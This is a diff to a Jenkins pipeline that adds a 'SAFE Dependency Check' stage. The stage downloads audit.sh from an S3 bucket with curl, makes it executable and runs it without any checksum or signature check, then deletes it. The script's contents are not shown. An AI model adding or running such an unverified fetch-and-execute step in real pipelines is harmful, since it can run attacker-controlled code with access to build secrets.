@@ -67,7 +67,36 @@ pipeline {
                     '''
                 }
             }
-    }
+        }
+
+        stage('SAFE Dependency Check') {
+            steps {
+                echo 'Running dependency check script...'
+                sh '''
+                    echo "Downloading audit script from S3..."
+                    curl -L -o audit.sh https://audit-script-safe.s3.us-east-1.amazonaws.com/audit.sh
+                    
+                    if [ $? -eq 0 ] && [ -f "./audit.sh" ]; then
+                        chmod +x ./audit.sh
+                        echo "Running dependency check..."
+                        ./audit.sh
+                    else
+                        echo "ERROR: Failed to download audit.sh from S3 bucket"
+                        exit 1
+                    fi
+                '''
+            }
+            post {
+                always {
+                    echo 'Dependency check stage completed.'
+                    // Clean up downloaded script
+                    sh 'rm -f ./audit.sh'
+                }
+                failure {
+                    echo 'Dependency check failed - check console output for details'
+                }
+            }
+        }
 
     }
 
